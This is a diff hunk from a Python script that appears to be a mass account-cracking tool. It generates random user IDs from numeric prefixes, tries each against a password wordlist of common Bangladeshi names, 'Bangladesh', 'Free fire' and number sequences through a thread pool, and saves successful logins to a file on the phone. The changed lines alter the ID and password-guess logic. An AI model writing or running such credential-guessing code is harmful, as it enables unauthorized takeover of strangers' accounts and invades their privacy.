@@ -277,9 +277,9 @@ def mathod1():
 		print(' USE [\033[1;32mAIRPLANE\033[1;37m] MODE FOR Ok IDS')
 		# print(' â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
 		for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
-            yaari.submit(rcrack1,uid,pwx,tl)
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+kode+'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','113355','22334455','121235']
+			yaari.submit(a,uid,pwx,tl)
 	print(47*'\033[1;31m\033[1;37m')
 	print(' [\033[1;32m!\033[1;37m] Cracking Complete')
 	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/LIVE Ã¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
